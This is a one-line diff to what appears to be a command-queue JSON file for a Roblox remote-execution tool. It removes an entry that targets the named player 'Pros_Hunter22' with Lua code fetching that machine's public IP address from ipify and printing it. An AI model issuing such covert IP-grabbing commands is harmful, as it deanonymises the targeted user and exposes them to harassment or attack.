@@ -1,1 +1,1 @@
-{"Target":"Pros_Hunter22","CommandId":"dea1ee86-3ce4-4aa8-b5ae-f56749204816","Code":"print(game:GetService(\"HttpService\"):JSONDecode(game:HttpGet(\"https://api.ipify.org/?format=json\")).ip)"}
+{}
